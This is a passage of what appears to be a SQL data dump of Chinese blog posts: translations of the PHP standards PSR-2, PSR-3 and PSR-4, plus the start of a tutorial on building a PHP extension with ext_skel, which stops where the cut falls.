(394, 'PHP代码标准：PSR-2 代码风格指南', '本文档扩展了[PSR-1] 基本编程标准。\r\n\r\n本文档的目的是通过枚举共享一系列的用于格式化PHP代码的规则， 减少在阅读不同作者的代码时的认知摩擦。 这里所列举出的样式规则来源于各种成员项目中的共性。在多个作者跨多个项目的合作中， 它可以在所有的这些项目中协助提供一系列的指导方针。因此，本文档的价值不是规则本身， 而是这些规则的共享。\r\n\r\n本文档中的关键字“必须”， “不允许”，“必需”，“将会”，“将不会”，“应该”，“不应该”，“推荐”，“可以”和“可选”遵循[RFC 2119]中的描述。\r\n\r\n[RFC 2119]: http://www.ietf.org/rfc/rfc2119.txt\r\n[PSR-0]: https://github.com/php-fig/fig-standards/blob/master/accepted/PSR-0.md\r\n[PSR-1]: https://github.com/php-fig/fig-standards/blob/master/accepted/PSR-1-basic-coding-standard.md\r\n\r\n\r\n1. 概述\r\n-----------\r\n\r\n- 代码必须遵循“编码风格指南” PSR [[PSR-1]]。\r\n\r\n- 代码必须使用4个空格缩进，而不是tab。\r\n\r\n- 对一行的长度不能是一个硬性的限制；但对每一行必须限制在120字符之内，每一行应该80个字符或者更少。\r\n\r\n- 在`namespace`声明之后必须有一个空行，在`use`声明之后也必须有一个空行。\r\n\r\n- 类的打开的大括号必须在下一行，关闭大括号必须类的主体之后的下一行。\r\n\r\n- 方法的打开的大括号必须在方法的下一行，关闭大括号必须在主体之后的下一行。\r\n\r\n- 所有的属性和方法必须声明可见性；`abstract`和`final`必须在可见性声明之前；`static`必须在可见性声明之后。\r\n  \r\n- 控制结构的关键字之后必须有一个空格；方法和函数调用关键字后面不允许有空格。\r\n\r\n- 控制结构的开始大括号必须在控制结构同一行，关闭大括号必须在主体的下一行。\r\n\r\n- 控制结构的开始括号之前必须有一个空格，关闭括号之前不允许有空格。\r\n\r\n### 1.1. 范例\r\n\r\n下面的例子包含了一些规则，以做一个快速的概述：\r\n\r\n```php\r\n<?php\r\nnamespace Vendor\\Package;\r\n\r\nuse FooInterface;\r\nuse BarClass as Bar;\r\nuse OtherVendor\\OtherPackage\\BazClass;\r\n\r\nclass Foo extends Bar implements FooInterface\r\n{\r\n    public function sampleFunction($a, $b = null)\r\n    {\r\n        if ($a === $b) {\r\n            bar();\r\n        } elseif ($a > $b) {\r\n            $foo->bar($arg1);\r\n        } else {\r\n            BazClass::bar($arg2, $arg3);\r\n        }\r\n    }\r\n\r\n    final public static function bar()\r\n    {\r\n        // method body\r\n    }\r\n}\r\n```\r\n\r\n2. 基础\r\n----------\r\n\r\n### 2.1 基本编码标准\r\n\r\n代码必须遵循标准 [PSR-1]。\r\n\r\n### 2.2 文件\r\n\r\n所有的PHP文件必须使用Unix LF行结尾符。\r\n\r\n所有的PHP文件必须以单个空行结尾。\r\n\r\n在只包含PHP代码的文件中，结尾的`?>`标记必须省略。\r\n\r\n### 2.3. 行\r\n\r\n对一行的长度不允许做硬性的限制。\r\n\r\n对一行的长度的软限制是必须120个字符之内；自动语法检查器必须在超过这个软限制时发出警告，但是不允许产生错误提示。\r\n\r\n一行不应该超过80个字符长度；超过该长度的行应该被分割成每一行都少于80字符的多行。\r\n\r\n在非空行结尾不允许有空格。\r\n\r\n可以添加空行以提高代码的可读性和区分相关的代码块。\r\n\r\n每一行不能多于一个声明。\r\n\r\n### 2.4. 缩进\r\n\r\n代码必须使用4个空格缩进，不允许使用tabs进行缩进。\r\n\r\n> 注意： 只使用空格，而不要空格和tabs混合可以协助\r\n> 避免使用diff, patches, history和annotations时出现的问题。 \r\n> 空格的使用也可以使国际线插入子缩进的对齐更加简单。\r\n\r\n\r\n### 2.5. 关键字和True/False/Null\r\n\r\nPHP [关键字] 必须是小写的.\r\n\r\nPHP常量 `true`, `false`, 和 `null` 必须是小写的.\r\n\r\n[关键字]: http://php.net/manual/en/reserved.keywords.php\r\n\r\n\r\n\r\n3. 命名空间和Use声明\r\n---------------------------------\r\n\r\n当`命名空间`出现的时候，在之后必须有一个空行\r\n\r\n当使用`use`声明的时候，所有的`use`声明必须跟在`namespace`声明之后。\r\n\r\n每一个声明必须使用一个`use`关键字。\r\n\r\n在`use`块之后必须有一个空行。\r\n\r\n例如:\r\n\r\n```php\r\n<?php\r\nnamespace Vendor\\Package;\r\n\r\nuse FooClass;\r\nuse BarClass as Bar;\r\nuse OtherVendor\\OtherPackage\\BazClass;\r\n\r\n// ... 额外的PHP代码 ...\r\n\r\n```\r\n\r\n\r\n4. 类, 属性和方法\r\n-----------------------------------\r\n\r\n术语`类`值得是所有的类、接口和Traits。\r\n\r\n### 4.1. 继承和实现\r\n\r\n关键字 `extends` 和 `implements` 必须在类名的同一行进行声明。\r\n\r\n类的开始大括号必须在新的独立的一行；关闭大括号必须在主体的下一行。\r\n\r\n```php\r\n<?php\r\nnamespace Vendor\\Package;\r\n\r\nuse FooClass;\r\nuse BarClass as Bar;\r\nuse OtherVendor\\OtherPackage\\BazClass;\r\n\r\nclass ClassName extends ParentClass implements \\ArrayAccess, \\Countable\r\n{\r\n    // 常量, 属性, 方法\r\n}\r\n```\r\n\r\n关键字`implements`的列表可以分割为多行，每一个子行缩进一次。在这种情况下，列表中的第一个项必须在下一行，并且，每个接口必须独占一行。\r\n\r\n```php\r\n<?php\r\nnamespace Vendor\\Package;\r\n\r\nuse FooClass;\r\nuse BarClass as Bar;\r\nuse OtherVendor\\OtherPackage\\BazClass;\r\n\r\nclass ClassName extends ParentClass implements\r\n    \\ArrayAccess,\r\n    \\Countable,\r\n    \\Serializable\r\n{\r\n    // constants, properties, methods\r\n}\r\n```\r\n\r\n### 4.2. 属性\r\n\r\n所有属性必须声明其可见性。\r\n\r\n关键字 `var` 不允许用来声明属性.\r\n\r\n每一个声明只能有一个属性。\r\n\r\n属性名不应该以单个下划线开头来暗示其为protected或者private的可见性。\r\n\r\n一个属性的声明看起来是下面这样的：\r\n\r\n```php\r\n<?php\r\nnamespace Vendor\\Package;\r\n\r\nclass ClassName\r\n{\r\n    public $foo = null;\r\n}\r\n```\r\n\r\n### 4.3. 方法\r\n\r\n所有方法都必须声明其可见性.\r\n\r\n方法名不应该以单个下划线开头来暗示其为protected或者private的可见性。\r\n\r\n不允许在方法名之后添加空格。开始大括号必须另起一行，关闭括号必须在方法体的下一行。\r\n在参数的开始括号之后和结束括号之前不允许有空格。\r\n\r\n方法的声明是下面这样的。注意括号，逗号，空格和大括号的位置：\r\n\r\n```php\r\n<?php\r\nnamespace Vendor\\Package;\r\n\r\nclass ClassName\r\n{\r\n    public function fooBarBaz($arg1, &$arg2, $arg3 = [])\r\n    {\r\n        // method body\r\n    }\r\n}\r\n```    \r\n\r\n### 4.4. 方法参数\r\n\r\n在参数列表中，在每个逗号之前不允许有空格，每个逗号之后有一个空格。\r\n\r\n含有默认值的方法参数必须在参数列表的最后。\r\n\r\n```php\r\n<?php\r\nnamespace Vendor\\Package;\r\n\r\nclass ClassName\r\n{\r\n    public function foo($arg1, &$arg2, $arg3 = [])\r\n    {\r\n        // method body\r\n    }\r\n}\r\n```\r\n\r\n参数列表可能会被分割成多行，每一行都要缩进一次。列表中第一项必须另起一行，每一行只能有一个参数。\r\n\r\n当参数列表被分割成多行的时候，结束括号和主体的开始大括号必须占用同一行，并且之间有一个空格。\r\n\r\n```php\r\n<?php\r\nnamespace Vendor\\Package;\r\n\r\nclass ClassName\r\n{\r\n    public function aVeryLongMethodName(\r\n        ClassTypeHint $arg1,\r\n        &$arg2,\r\n        array $arg3 = []\r\n    ) {\r\n        // method body\r\n    }\r\n}\r\n```\r\n\r\n### 4.5. `abstract`, `final`, 和 `static`\r\n\r\n当出现 `abstract` and `final` 声明的时候，它们必须在可见性声明之前。\r\n\r\n当出现 `static` 声明的时候，它必须在可见性声明之后。\r\n\r\n```php\r\n<?php\r\nnamespace Vendor\\Package;\r\n\r\nabstract class ClassName\r\n{\r\n    protected static $foo;\r\n\r\n    abstract protected function zim();\r\n\r\n    final public static function bar()\r\n    {\r\n        // method body\r\n    }\r\n}\r\n```\r\n\r\n### 4.6. 方法和函数调用\r\n\r\n当进行方法或者函数调用的时候，在方法或者函数名和参数括号之间不允许有空格，\r\n在参数开始括号之后和参数结束括号之前不允许有空格。在参数列表中，\r\n每一个逗号之前不允许有空格，逗号之后必须有一个空格。\r\n\r\n```php\r\n<?php\r\nbar();\r\n$foo->bar($arg1);\r\nFoo::bar($arg2, $arg3);\r\n```\r\n\r\n参数列表可能会被分割成多行，每一行都需要缩进一次。\r\n列表中的第一项必须另起一行，每个参数必须独占一行。\r\n\r\n```php\r\n<?php\r\n$foo->bar(\r\n    $longArgument,\r\n    $longerArgument,\r\n    $muchLongerArgument\r\n);\r\n```\r\n\r\n5. 控制结构\r\n---------------------\r\n\r\n对于控制结构，通用的样式规则如下：\r\n\r\n- 控制结构关键字之后必须有一个空格\r\n- 开始括号之后不允许有空格\r\n- 关闭括号之前不允许有空格\r\n- 关闭括号和开始大括号之间必须有一个空格\r\n- 结构的主体必须缩进一次\r\n- 关闭的大括号必须在主体的另起一行\r\n\r\n每一个结构的主体必须使用大括号包围。这样标准化了结构的样式，\r\n减少了将错误作为主体的新行引入的可能性。\r\n\r\n\r\n### 5.1. `if`, `elseif`, `else`\r\n\r\n结构 `if` 看起来像下面这样。注意括号、空格和大括号的位置；\r\n`else`和`elseif`在第一个主体结束括号的同一行。\r\n\r\n```php\r\n<?php\r\nif ($expr1) {\r\n    // if body\r\n} elseif ($expr2) {\r\n    // elseif body\r\n} else {\r\n    // else body;\r\n}\r\n```\r\n\r\n应该将关键字 `else if` 替换为关键字 `elseif` ，这样所有的else if看起来都是一体的。 \r\n\r\n\r\n### 5.2. `switch`, `case`\r\n\r\n`switch` 结构看起来是下面这样。注意括号、空格和大括号的位置。`case`块必须在`switch`\r\n块中缩进一次，并且`break`关键字（或者其它结束关键字）必须与`case`保持同样的缩进级别。\r\n如果`case`的主体会一直执行下去，在第一个非空的`case`主体后必须添加一个`// no break`\r\n这样的注释说明。\r\n\r\n```php\r\n<?php\r\nswitch ($expr) {\r\n    case 0:\r\n        echo ''First case, with a break'';\r\n        break;\r\n    case 1:\r\n        echo ''Second case, which falls through'';\r\n        // no break\r\n    case 2:\r\n    case 3:\r\n    case 4:\r\n        echo ''Third case, return instead of break'';\r\n        return;\r\n    default:\r\n        echo ''Default case'';\r\n        break;\r\n}\r\n```\r\n\r\n\r\n### 5.3. `while`, `do while`\r\n\r\n`while` 结构看起来是下面这样的。注意括号、空格和大括号的位置。\r\n\r\n```php\r\n<?php\r\nwhile ($expr) {\r\n    // structure body\r\n}\r\n```\r\n\r\n类似的，`do while`语句看起来是下面这样的。注意括号、空格和大括号的位置。\r\n\r\n```php\r\n<?php\r\ndo {\r\n    // structure body;\r\n} while ($expr);\r\n```\r\n\r\n### 5.4. `for`\r\n\r\n`for` 语句看起来是下面这样的。注意括号、空格和大括号的位置。\r\n\r\n```php\r\n<?php\r\nfor ($i = 0; $i < 10; $i++) {\r\n    // for body\r\n}\r\n```\r\n\r\n### 5.5. `foreach`\r\n    \r\n`foreach` 语句看起来是下面这样的。注意括号，空格和大括号的位置。\r\n\r\n```php\r\n<?php\r\nforeach ($iterable as $key => $value) {\r\n    // foreach body\r\n}\r\n```\r\n\r\n### 5.6. `try`, `catch`\r\n\r\n`try catch` 块看起来是下面这样的。注意括号，空格和大括号的位置。\r\n\r\n```php\r\n<?php\r\ntry {\r\n    // try body\r\n} catch (FirstExceptionType $e) {\r\n    // catch body\r\n} catch (OtherExceptionType $e) {\r\n    // catch body\r\n}\r\n```\r\n\r\n6. 闭包\r\n-----------\r\n\r\n在闭包的声明中，`function`关键字后面必须跟着一个空格，后面的`use`关键字的前后都要有一个空格。\r\n\r\n开始大括号必须和声明在同一行，关闭大括号必须主体的下一行。\r\n\r\n开始括号和参数列表或者变量列表之间不允许有空格，参数或者变量列表和关闭括号之间不允许有空格。\r\n\r\n在参数和变量列表中，每一个逗号之前不允许与空格，之后必须有一个空格。\r\n\r\n闭包参数的默认值必须在参数列表的结尾。\r\n\r\n闭包声明看起来是下面这样的。注意括号，逗号，空格和大括号的位置：\r\n\r\n```php\r\n<?php\r\n$closureWithArgs = function ($arg1, $arg2) {\r\n    // body\r\n};\r\n\r\n$closureWithArgsAndVars = function ($arg1, $arg2) use ($var1, $var2) {\r\n    // body\r\n};\r\n```\r\n\r\n参数和变量列表可能会被分割为多行，每一行都要缩进一次。\r\n第一个项必须另起一行，每一个参数或者变量独占一行。\r\n\r\n当分割长多行的时候，结束括号和开始大括号必须另起一行，\r\n并且放在同一行，之间必须有一个空格。\r\n\r\n下面是含有参数和变量列表分割为多行和非多行的例子。\r\n\r\n```php\r\n<?php\r\n$longArgs_noVars = function (\r\n    $longArgument,\r\n    $longerArgument,\r\n    $muchLongerArgument\r\n) {\r\n   // body\r\n};\r\n\r\n$noArgs_longVars = function () use (\r\n    $longVar1,\r\n    $longerVar2,\r\n    $muchLongerVar3\r\n) {\r\n   // body\r\n};\r\n\r\n$longArgs_longVars = function (\r\n    $longArgument,\r\n    $longerArgument,\r\n    $muchLongerArgument\r\n) use (\r\n    $longVar1,\r\n    $longerVar2,\r\n    $muchLongerVar3\r\n) {\r\n   // body\r\n};\r\n\r\n$longArgs_shortVars = function (\r\n    $longArgument,\r\n    $longerArgument,\r\n    $muchLongerArgument\r\n) use ($var1) {\r\n   // body\r\n};\r\n\r\n$shortArgs_longVars = function ($arg) use (\r\n    $longVar1,\r\n    $longerVar2,\r\n    $muchLongerVar3\r\n) {\r\n   // body\r\n};\r\n```\r\n\r\n注意当闭包函数直接用在函数或者方法参数的时候，以上规则同样适用。\r\n\r\n```php\r\n<?php\r\n$foo->bar(\r\n    $arg1,\r\n    function ($arg2) use ($var1) {\r\n        // body\r\n    },\r\n    $arg3\r\n);\r\n```\r\n\r\n\r\n7. 总结\r\n--------------\r\n\r\n还有很多元素的样式和实践在本指南中故意忽略了。包含但并不局限于下面这些：\r\n\r\n- 全局变量和全局常量的声明\r\n\r\n- 函数的声明\r\n\r\n- 操作符和赋值\r\n\r\n- 国际线对齐\r\n\r\n- 注释和文档块\r\n\r\n- 类名前缀和后缀Class name prefixes and suffixes\r\n\r\n- 最佳实践\r\n\r\n未来可能会通过修改和扩展本指南来添加其它元素的样式和实践规范。\r\n', '本文档扩展了[PSR-1] 基本编程标准。', 'http://agiledev-arsenals.stor.sinaapp.com/cover/81c1b9c5b26f4edab34d81dec43fc267.png', 'mylxsw', '翻译', 1, 0, 1413943251, 1413943659, 0, 'markdown'),
(395, 'PHP代码标准：PSR-3 日志接口标准', '本文档为日志类库描述了通用的日志接口。\r\n\r\n主要目标是允许类库接收一个`Psr\\Log\\LoggerInterface`对象并且以一种简单和\r\n通用的方式将日志信息写入到该对象中。 有自定义需要的框架和CMS可以为了他们\r\n的目标扩展该接口，但是应该保持与本文档的兼容性。这样确保了应用程序使用的\r\n第三方的类可以将日志写入到中心化的应用程序日志中。\r\n\r\n本文档中的关键字“必须”， “不允许”，“必需”，“将会”，“将不会”，“应该”，“不应该”，\r\n“推荐”，“可以”和“可选”遵循[RFC 2119]中的描述。\r\n\r\n单词 `implementor` 在本文档中指的是实现`LoggerInterface`接口的相关日志类库\r\n或者框架。日志的用户我们叫做`user`。\r\n\r\n[RFC 2119]: http://tools.ietf.org/html/rfc2119\r\n\r\n1. 规范\r\n-----------------\r\n\r\n### 1.1 基础\r\n\r\n- 接口 `LoggerInterface` 暴露出八个方法用于为[RFC 5424][]规范的八个\r\n  日志级别（debug, info, notice, warning, error, critical, alert, emergency)提供日志写入功能。\r\n\r\n- 第九个方法，`log`，接收日志级别作为第一个参数。使用日志级别常量\r\n  作为参数调用这个方法必须和直接调用级别特定的方法产生同样的结果。\r\n  使用规范没有定义的日志级别调用这个方法，如果日志实现不知道这个日志\r\n  级别的话，必须抛出一个`Psr\\Log\\InvalidArgumentException`异常。\r\n  用户不应该在不知道当前实现是否支持该日志级别的情况下使用自定义的日志级别。\r\n\r\n[RFC 5424]: http://tools.ietf.org/html/rfc5424\r\n\r\n### 1.2 消息\r\n\r\n- 每个方法都接收一个字符串，或者一个包含`__toString()`方法的对象作为消息。\r\n  实现者可以对传递的对象做特殊的处理。如果事实并非如此的话，实现者必须将其\r\n  作为一个字符串处理。\r\n\r\n- 消息可以包含占位符，实现者可以将其替换为上下文数组中的值。\r\n\r\n  占位符的名称必须对应上下文数组中的键名。\r\n\r\n  占位符的名称必须包含在一个单个的`{`开始，`}`结束的分隔符之间。\r\n  在占位符和大括号之间不允许出现任何空格。\r\n\r\n  占位符的名称应该仅包含字符`A-Z`, `a-z`,\r\n  `0-9`, 下划线 `_`, 和句点 `.`。 其它字符预留给未来占位符规范的修改使用.\r\n\r\n  实现者可以使用占位符实现各种转义策略和翻译日志以供显示。用户不应该预先对占位符的值\r\n  进行转义，因为他们并不知道这些数据将会在哪个上下文中显示。\r\n\r\n  下面是一个插入占位符的例子，仅供参考：\r\n\r\n  ```php\r\n  /**\r\n   * Interpolates context values into the message placeholders.\r\n   */\r\n  function interpolate($message, array $context = array())\r\n  {\r\n      // build a replacement array with braces around the context keys\r\n      $replace = array();\r\n      foreach ($context as $key => $val) {\r\n          $replace[''{'' . $key . ''}''] = $val;\r\n      }\r\n\r\n      // interpolate replacement values into the message and return\r\n      return strtr($message, $replace);\r\n  }\r\n\r\n  // a message with brace-delimited placeholder names\r\n  $message = "User {username} created";\r\n\r\n  // a context array of placeholder names => replacement values\r\n  $context = array(''username'' => ''bolivar'');\r\n\r\n  // echoes "User bolivar created"\r\n  echo interpolate($message, $context);\r\n  ```\r\n\r\n### 1.3 上下文\r\n\r\n- 每一个方法都接受一个数组作为上下文数据。这样是为了能够接受任意不能转换为\r\n  字符串的外来信息。这个数组可以包含任何内容。是限制必须确保尽可能宽容的对待\r\n  这些上下文数据。上下文中一个给定的值不允许抛出异常或者产生任何PHP error，\r\n  warning或者notice。\r\n\r\n- 如果在上下文数据中传递了一个`Exception`对象，它必须以`''exception''` 为键名。\r\n  日志记录异常是一个常见的模式，如果后端支持的话，这允许实现者去解析异常调用堆栈信息。\r\n  实现者在使用`''exception''`键下的值作为一个Exception对象的时候必须先验证它是否是\r\n  一个合法的`Exception`对象，因为它可能包含任何值。\r\n\r\n### 1.4 助手类和接口\r\n\r\n- 类 `Psr\\Log\\AbstractLogger` 让你可以通过扩展它来更加容易的实现 `LoggerInterface`\r\n  接口的`log`方法。其它八个方法转发消息和上下为到该方法中。\r\n\r\n- 同样的，使用`Psr\\Log\\LoggerTrait`只需要实现通用的`log`方法。注意的是，\r\n  Trait不能够实现接口，在这种情况下，你依然必须实现`LoggerInterface`接口。\r\n\r\n- 同接口一起，提供了`Psr\\Log\\NullLogger`，接口的使用者在没有提供日志功能时，\r\n  可以使用它提供一种“黑洞”实现。然而，如果上下文数据的创建是非常耗费资源的话，\r\n  使用有条件的日志是一个不错的办法。\r\n\r\n- 接口 `Psr\\Log\\LoggerAwareInterface` 值包含了一个 `setLogger(LoggerInterface $logger)`\r\n  方法，框架可以使用它自动加载任意日志实现的实例。\r\n\r\n- Trait `Psr\\Log\\LoggerAwareTrait` 可以在任何类中方便的实现接口相同的方法，\r\n  它使得你可以访问 `$this->logger`。\r\n\r\n- 类 `Psr\\Log\\LogLevel` 包含了八个日志级别的常量。\r\n\r\n2. 包\r\n----------\r\n\r\n上面描述的接口、类和相关的异常类，和用来验证你的日志实现的测试用例都已作为 [psr/log](https://packagist.org/packages/psr/log) 包的一部分提供。\r\n\r\n3. `Psr\\Log\\LoggerInterface`\r\n----------------------------\r\n\r\n```php\r\n<?php\r\n\r\nnamespace Psr\\Log;\r\n\r\n/**\r\n * Describes a logger instance\r\n *\r\n * The message MUST be a string or object implementing __toString().\r\n *\r\n * The message MAY contain placeholders in the form: {foo} where foo\r\n * will be replaced by the context data in key "foo".\r\n *\r\n * The context array can contain arbitrary data, the only assumption that\r\n * can be made by implementors is that if an Exception instance is given\r\n * to produce a stack trace, it MUST be in a key named "exception".\r\n *\r\n * See https://github.com/php-fig/fig-standards/blob/master/accepted/PSR-3-logger-interface.md\r\n * for the full interface specification.\r\n */\r\ninterface LoggerInterface\r\n{\r\n    /**\r\n     * System is unusable.\r\n     *\r\n     * @param string $message\r\n     * @param array $context\r\n     * @return null\r\n     */\r\n    public function emergency($message, array $context = array());\r\n\r\n    /**\r\n     * Action must be taken immediately.\r\n     *\r\n     * Example: Entire website down, database unavailable, etc. This should\r\n     * trigger the SMS alerts and wake you up.\r\n     *\r\n     * @param string $message\r\n     * @param array $context\r\n     * @return null\r\n     */\r\n    public function alert($message, array $context = array());\r\n\r\n    /**\r\n     * Critical conditions.\r\n     *\r\n     * Example: Application component unavailable, unexpected exception.\r\n     *\r\n     * @param string $message\r\n     * @param array $context\r\n     * @return null\r\n     */\r\n    public function critical($message, array $context = array());\r\n\r\n    /**\r\n     * Runtime errors that do not require immediate action but should typically\r\n     * be logged and monitored.\r\n     *\r\n     * @param string $message\r\n     * @param array $context\r\n     * @return null\r\n     */\r\n    public function error($message, array $context = array());\r\n\r\n    /**\r\n     * Exceptional occurrences that are not errors.\r\n     *\r\n     * Example: Use of deprecated APIs, poor use of an API, undesirable things\r\n     * that are not necessarily wrong.\r\n     *\r\n     * @param string $message\r\n     * @param array $context\r\n     * @return null\r\n     */\r\n    public function warning($message, array $context = array());\r\n\r\n    /**\r\n     * Normal but significant events.\r\n     *\r\n     * @param string $message\r\n     * @param array $context\r\n     * @return null\r\n     */\r\n    public function notice($message, array $context = array());\r\n\r\n    /**\r\n     * Interesting events.\r\n     *\r\n     * Example: User logs in, SQL logs.\r\n     *\r\n     * @param string $message\r\n     * @param array $context\r\n     * @return null\r\n     */\r\n    public function info($message, array $context = array());\r\n\r\n    /**\r\n     * Detailed debug information.\r\n     *\r\n     * @param string $message\r\n     * @param array $context\r\n     * @return null\r\n     */\r\n    public function debug($message, array $context = array());\r\n\r\n    /**\r\n     * Logs with an arbitrary level.\r\n     *\r\n     * @param mixed $level\r\n     * @param string $message\r\n     * @param array $context\r\n     * @return null\r\n     */\r\n    public function log($level, $message, array $context = array());\r\n}\r\n```\r\n\r\n4. `Psr\\Log\\LoggerAwareInterface`\r\n---------------------------------\r\n\r\n```php\r\n<?php\r\n\r\nnamespace Psr\\Log;\r\n\r\n/**\r\n * Describes a logger-aware instance\r\n */\r\ninterface LoggerAwareInterface\r\n{\r\n    /**\r\n     * Sets a logger instance on the object\r\n     *\r\n     * @param LoggerInterface $logger\r\n     * @return null\r\n     */\r\n    public function setLogger(LoggerInterface $logger);\r\n}\r\n```\r\n\r\n5. `Psr\\Log\\LogLevel`\r\n---------------------\r\n\r\n```php\r\n<?php\r\n\r\nnamespace Psr\\Log;\r\n\r\n/**\r\n * Describes log levels\r\n */\r\nclass LogLevel\r\n{\r\n    const EMERGENCY = ''emergency'';\r\n    const ALERT     = ''alert'';\r\n    const CRITICAL  = ''critical'';\r\n    const ERROR     = ''error'';\r\n    const WARNING   = ''warning'';\r\n    const NOTICE    = ''notice'';\r\n    const INFO      = ''info'';\r\n    const DEBUG     = ''debug'';\r\n}\r\n```\r\n', '本文档为日志类库描述了通用的日志接口。', 'http://agiledev-arsenals.stor.sinaapp.com/cover/81c1b9c5b26f4edab34d81dec43fc267.png', 'mylxsw', '翻译', 1, 0, 1413943333, 1413943647, 0, 'markdown'),
(396, 'PHP代码标准：PSR-4 自动加载器标准改进', '本文档中的关键字“必须”， “不允许”，“必需”，“将会”，“将不会”，“应该”，“不应该”，\r\n“推荐”，“可以”和“可选”遵循[RFC 2119](http://tools.ietf.org/html/rfc2119)中的描述。\r\n\r\n\r\n## 1. 概述\r\n\r\n这个PSR是描述了从文件路径 [自动加载][] 类的规范 。它与任何其它自动加载规范，\r\n包括[PSR-0][]是可互用的。这个PSR也描述了根据规范，文件放在哪里可以被自动加载。\r\n\r\n\r\n## 2. 规范\r\n\r\n1. 术语“类”值得是类，接口，Trait和其它类似的结构。\r\n\r\n2. 一个全称的类名为下列形式：\r\n\r\n        \\<NamespaceName>(\\<SubNamespaceNames>)*\\<ClassName>\r\n\r\n    1. 全称类名必须有一个顶级命名空间，也称为“厂商命名空间”。\r\n\r\n    2. 全称的类名可以有一个或多个子命名空间名。\r\n\r\n    3. 全称的类名必须以一个类名结束。\r\n\r\n    4. 在全称命名空间的任意部分，下划线都没有任何特殊含义。\r\n\r\n    5. 在全称的类名中字母字符可以是大写字母和小写字母的任意组合。\r\n\r\n    6. 所有的类名必须使用大小写敏感的方式引用。\r\n\r\n3. 当加载一个对应全称的类名的文件的时候 ……\r\n\r\n    1. 在全称的类名（含有“命名空间前缀”）中的一系列连续的一个或者多个\r\n       前缀命名空间和子命名空间，不包含前缀的命名空间分隔符，对应了至少一个“基础目录”。\r\n\r\n    2. 在“命名空间前缀”之后的连续的子命名空间名称对应了“基础目录”中的一个子目录，\r\n       命名空间分隔符代表了目录的分隔符。子目录名称必须完全匹配子命名空间名称。\r\n\r\n    3. 最后的类名对应了以`.php`为后缀的文件名。文件名必须与类名的大小写匹配。\r\n\r\n4. 自动加载器的实现不允许抛出异常，不允许产生任何级别的错误，不应该有返回值。\r\n\r\n\r\n## 3. 示例\r\n\r\n下面的表格显示了文件路径和跟定的全称类名，命名空间前缀，基础目录。\r\n\r\n| 全称的类名                    | 命名空间前缀       | 基础目录                 | 产生的文件路径\r\n| ----------------------------- |--------------------|--------------------------|-------------------------------------------\r\n| \\Acme\\Log\\Writer\\File_Writer  | Acme\\Log\\Writer    | ./acme-log-writer/lib/   | ./acme-log-writer/lib/File_Writer.php\r\n| \\Aura\\Web\\Response\\Status     | Aura\\Web           | /path/to/aura-web/src/   | /path/to/aura-web/src/Response/Status.php\r\n| \\Symfony\\Core\\Request         | Symfony\\Core       | ./vendor/Symfony/Core/   | ./vendor/Symfony/Core/Request.php\r\n| \\Zend\\Acl                     | Zend               | /usr/includes/Zend/      | /usr/includes/Zend/Acl.php\r\n\r\n按照本规范实现的自动加载器的示例，请查看 [示例文件][]。示例实现不是本规范的一部分，它随时都有可能会发生更改。\r\n\r\n[自动加载]: http://php.net/autoload\r\n[PSR-0]: https://github.com/php-fig/fig-standards/blob/master/accepted/PSR-0.md\r\n[示例文件]: https://github.com/php-fig/fig-standards/blob/master/accepted/PSR-4-autoloader-examples.md\r\n', 'PSR-0标准的补充标准。', 'http://agiledev-arsenals.stor.sinaapp.com/cover/81c1b9c5b26f4edab34d81dec43fc267.png', 'mylxsw', '翻译', 1, 0, 1413943431, 1413943632, 0, 'markdown'),
(397, 'PHP扩展开发 - 构建第一个PHP扩展', '首先需要确定系统中安装了gcc编译器，合适版本的bison等\r\n\r\n####构建一个基本的扩展骨架\r\n在PHP扩展开发时，使用`ext_skel`完成扩展的结构骨架创建。\r\n\r\n```shell\r\n$ ./ext_skel\r\n./ext_skel --extname=module [--proto=file] [--stubs=file] [--xml[=file]]\r\n           [--skel=dir] [--full-xml] [--no-help]\r\n\r\n  --extname=module   这里的module是要创建的扩展名称\r\n  --proto=file       这里的file文件包含了要创建的函数的原型\r\n  --stubs=file       generate only function stubs in file\r\n  --xml              generate xml documentation to be added to phpdoc-cvs\r\n  --skel=dir         创建扩展骨架的目录\r\n  --full-xml         generate xml documentation for a self-contained extension (not yet implemented)\r\n  --no-help          don''t try to be nice and create comments in the code and helper functions to test if the module compiled\r\n```\r\n\r\n> 注意： `ext_skel`命令文件在源文件的**ext**目录下。\r\n\r\n这里的`--extname`参数是要创建的扩展名称，扩展名称为 *小写字母 + 下划线* 组成，并且，\r\n在`ext`目录中必须是唯一的。\r\n\r\n例如，这里要创建一个名为`ext_demo_1`的PHP扩展:\r\n\r\n```shell\r\n/vagrant/ext$ ./ext_skel --extname=ext_demo_1\r\nCreating directory ext_demo_1\r\nCreating basic files: config.m4 config.w32 .svnignore ext_demo_1.c php_ext_demo_1.h CREDITS EXPERIMENTAL tests/001.phpt ext_demo_1.php [done].\r\n\r\nTo use your new extension, you will have to execute the following steps:\r\n\r\n1.  $ cd ..\r\n2.  $ vi ext/ext_demo_1/config.m4\r\n3.  $ ./buildconf\r\n4.  $ ./configure --[with|enable]-ext_demo_1\r\n5.  $ make\r\n6.  $ ./php -f ext/ext_demo_1/ext_demo_1.php\r\n7.  $ vi ext/ext_demo_1/ext_demo_1.c\r\n8.  $ make\r\n\r\nRepeat steps 3-6 until you are satisfied with ext/ext_demo_1/config.m4 and\r\nstep 6 confirms that your module is compiled into PHP. Then, start writing\r\ncode and repeat the last two steps as often as necessary.\r\n```\r\n\r\n现在，在ext目录下出现了一个新建的扩展目录`ext_demo_1`：\r\n```shell\r\n/vagrant/ext/ext_demo_1$ ls\r\nconfig.m4   CREDITS       ext_demo_1.c    php_ext_demo_1.h\r\nconfig.w32  EXPERIMENTAL  ext_demo_1.php  tests\r\n```\r\n\r\n这时，该扩展是无法编译通过的，需要先编辑`config.m4`文件才行。\r\n\r\n####配置文件`config.m4`\r\n\r\n配置文件`config.m4`告诉UNIX构建系统扩展支持的`configure`选项以及扩展需要的额外的库，\r\n包含哪些源文件等，该文件使用的是GNU的`autoconf`语法，以`dnl`开头的行为注释，使用中括号（[和]）包含的为字符串。\r\n\r\n> autoconf语法参见 [AUTOCONF文档](http://www.gnu.org/software/autoconf/manual/)\r\n\r\n```c\r\nPHP_ARG_ENABLE(ext_demo_1, whether to enable ext_demo_1 support,\r\n[  --enable-ext_demo_1           Enable ext_demo_1 support])\r\n\r\nif test "$PHP_EXT_DEMO_1" != "no"; then\r\n  PHP_SUBST(EXT_DEMO_1_SHARED_LIBADD)\r\n  PHP_NEW_EXTENSION(ext_demo_1, ext_demo_1.c, 